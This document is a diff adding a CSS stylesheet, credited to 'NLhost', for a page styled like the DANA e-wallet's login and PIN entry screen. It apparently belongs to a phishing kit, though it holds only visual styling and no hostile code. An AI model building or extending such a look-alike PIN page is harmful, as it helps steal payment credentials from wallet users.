@@ -1,0 +1,119 @@
+/* Ambil kode Gw! boleh aja.., asal Lu tau diri bre.
+// Note: hargai pembuat kode dan tidak mengubah copyrigth.
+// ©2026 - develofer By NLhost */
+* {
+    font-family: "Open Sans", Arial, sans-serif;
+    font-weight: 600;
+    margin: 0;
+    padding: 0;
+}
+
+body{
+    background: #fff;
+}
+
+.nav-dana{
+    width: 100%;
+    padding: 5px;
+    display: flex;
+    justify-content: space-between;
+    align-content: center;
+    align-items: center;
+    background: #118EEA;
+}
+
+.nav-dana img{
+    width: 20px;
+    float: left;
+}
+
+.nav-dana .masuk{
+    font-size: 19px;
+    font-weight: 600;
+    color: #fff;
+}
+
+.nav-dana p{
+    color: #118EEA;
+}
+
+#formPin{
+    background-color: transparent;
+    margin-top: 30px;
+}
+
+.masukpin{
+    text-align: center;
+}
+
+.box-input-pin{
+    width: 30%;
+    margin-top: 20px;
+    display: flex;
+    justify-content: center;
+    align-content: center;
+    align-items: center;
+    margin: 0 auto;
+    gap: 30px;
+    justify-content: center;
+    padding: 20px;
+    background: transparent;
+}
+
+.inppin {
+    width: 13px;
+    height: 13px;
+    background: #ccc;
+    border: none;
+    color: #000 !important;
+    font-size: 8px;
+    outline: none;
+    border-radius: 100%;
+    text-align: center;
+}
+
+.inppin:not(:placeholder-shown){
+    background: #222;
+    border: none;
+    box-shadow: 0 0 0 transparent;
+    color: #fff;
+}
+
+.box-cs{
+    width: 70%;
+    background-color: transparent;
+    display: flex;
+    justify-content: space-between;
+    align-content: center;
+    align-items: center;
+    margin: 26px auto;
+}
+
+.flex-cs{
+    display: flex;
+    align-content: center;
+    align-items: center;
+    color: #118EEA;
+    font-size: 12px;
+}
+
+.flex-cs img{
+      width: 24px;
+      height: 24px;
+      vertical-align: middle;
+      margin-right: 5px;
+    }
+
+.riset-pin{
+    display: flex;
+    float: right;
+    color: #118EEA;
+    font-size: 12px;
+}
+
+.clearPin{
+    background: transparent;
+    width: 100%;
+    height: 100px;
+    position: absolute;
+}
